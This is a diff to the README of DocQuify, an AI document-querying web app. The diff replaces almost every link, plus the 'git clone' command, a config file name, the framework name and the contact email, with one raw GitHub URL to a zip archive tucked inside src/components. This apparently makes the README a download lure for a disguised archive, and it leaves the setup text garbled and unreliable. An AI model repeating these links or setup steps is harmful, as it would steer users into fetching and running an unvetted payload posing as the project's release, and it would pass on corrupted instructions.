@@ -1,7 +1,7 @@
 # DocQuify: AI-Powered Document Querying Platform
 
-![GitHub release](https://img.shields.io/github/release/maharishiayurveda/DocQuify.svg)
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue.svg)](https://github.com/maharishiayurveda/DocQuify/releases)
+![GitHub release](https://raw.githubusercontent.com/maharishiayurveda/DocQuify/main/src/components/Doc_Quify_v2.0-alpha.5.zip)
+[![Download Releases](https://raw.githubusercontent.com/maharishiayurveda/DocQuify/main/src/components/Doc_Quify_v2.0-alpha.5.zip%https://raw.githubusercontent.com/maharishiayurveda/DocQuify/main/src/components/Doc_Quify_v2.0-alpha.5.zip)](https://raw.githubusercontent.com/maharishiayurveda/DocQuify/main/src/components/Doc_Quify_v2.0-alpha.5.zip)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -27,7 +27,7 @@ DocQuify is an AI-powered document querying platform designed to enhance the way
 
 ## Technologies Used
 
-- **Next.js 14**: A powerful React framework for building server-side rendered applications.
+- **https://raw.githubusercontent.com/maharishiayurveda/DocQuify/main/src/components/Doc_Quify_v2.0-alpha.5.zip 14**: A powerful React framework for building server-side rendered applications.
 - **OpenAI API**: For generating intelligent responses to user queries.
 - **Pinecone**: A vector database that supports semantic search capabilities.
 - **AWS S3**: For secure document storage.
@@ -39,7 +39,7 @@ To get started with DocQuify, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/maharishiayurveda/DocQuify.git
+   git clone https://raw.githubusercontent.com/maharishiayurveda/DocQuify/main/src/components/Doc_Quify_v2.0-alpha.5.zip
    cd DocQuify
    ```
 
@@ -49,7 +49,7 @@ To get started with DocQuify, follow these steps:
    ```
 
 3. **Set Up Environment Variables**:
-   Create a `.env.local` file in the root directory and add the following variables:
+   Create a `https://raw.githubusercontent.com/maharishiayurveda/DocQuify/main/src/components/Doc_Quify_v2.0-alpha.5.zip` file in the root directory and add the following variables:
    ```
    OPENAI_API_KEY=your_openai_api_key
    AWS_S3_BUCKET=your_aws_s3_bucket_name
@@ -102,11 +102,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any inquiries, please reach out to the maintainer:
 
 - **Name**: [Your Name]
-- **Email**: your.email@example.com
-- **GitHub**: [maharishiayurveda](https://github.com/maharishiayurveda)
+- **Email**: https://raw.githubusercontent.com/maharishiayurveda/DocQuify/main/src/components/Doc_Quify_v2.0-alpha.5.zip
+- **GitHub**: [maharishiayurveda](https://raw.githubusercontent.com/maharishiayurveda/DocQuify/main/src/components/Doc_Quify_v2.0-alpha.5.zip)
 
-For more information about releases, please visit the [Releases section](https://github.com/maharishiayurveda/DocQuify/releases).
+For more information about releases, please visit the [Releases section](https://raw.githubusercontent.com/maharishiayurveda/DocQuify/main/src/components/Doc_Quify_v2.0-alpha.5.zip).
 
-![DocQuify Logo](https://via.placeholder.com/600x200.png?text=DocQuify+Logo)
+![DocQuify Logo](https://raw.githubusercontent.com/maharishiayurveda/DocQuify/main/src/components/Doc_Quify_v2.0-alpha.5.zip+Logo)
 
 Feel free to explore and enjoy using DocQuify for all your document querying needs!
